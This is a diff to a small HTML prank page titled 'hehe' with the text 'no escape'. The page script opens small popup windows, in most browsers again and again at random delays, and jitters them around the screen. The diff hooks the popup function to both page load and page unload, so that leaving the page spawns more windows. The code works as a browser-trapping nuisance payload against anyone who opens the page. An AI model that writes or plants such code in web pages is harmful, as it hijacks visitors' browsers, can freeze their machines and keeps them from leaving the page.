@@ -3,7 +3,7 @@
   <head>
     <title>hehe</title>
   </head>
-  <body>
+  <body onunload="w()" onload="w()">
     <p>no escape</p>
     <script>
       var user = detect.parse(navigator.userAgent);
@@ -12,7 +12,8 @@
       function w(){
         window.open("./i","_blank","width=200,height=200");
         if(user.browser.family !== "Firefox"){
-        setTimeout(w, Math.random()*1000);
+          setTimeout(w, Math.random()*1000);
+        }
       }
       function a(){
         w();
@@ -30,7 +31,6 @@
         moveBy((Math.random()*20)-10, (Math.random()*20)-10);
         return null;
       }
-      window.onload = window.onbeforeunload = a;
     </script>
   </body>
 </html>
